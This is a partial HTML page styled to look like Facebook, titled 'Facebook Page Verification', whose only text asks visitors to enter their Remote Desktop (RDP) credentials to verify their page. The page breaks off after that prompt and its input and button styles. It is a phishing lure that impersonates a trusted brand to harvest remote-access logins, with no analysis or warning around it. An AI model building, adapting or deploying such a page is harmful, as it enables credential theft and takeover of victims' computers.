<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">

    <title>Facebook Page Verification</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f2f5;
            text-align: center;
            margin: 0;
            padding: 0;
        }
        .container {
            width: 100%;
            max-width: 400px;
            background: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            margin: 50px auto;
        }
        .logo img {
            width: 200px;
        }
        h2 {
            color: #1877f2;
            font-size: 22px;
        }
        p {
            font-size: 14px;
            color: #555;
        }
        input {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ddd;
            border-radius: 5px;
            font-size: 16px;
        }
        .btn {
            background-color: #1877f2;
            color: white;
            border: none;
            padding: 10px;
            font-size: 16px;
            cursor: pointer;
            width: 100%;
            border-radius: 5px;
        }
        .btn:hover {
            background-color: #165fc1;
        }
        .footer {
            margin-top: 15px;
            font-size: 12px;
            color: #888;
        }
    </style>
</head>

    <div class="container">
        <div class="logo">

        </div>
        <h2>Verify Your Facebook Page</h2>
        <p>To verify your page, please enter your Remote Desktop (RDP) credentials.</p>
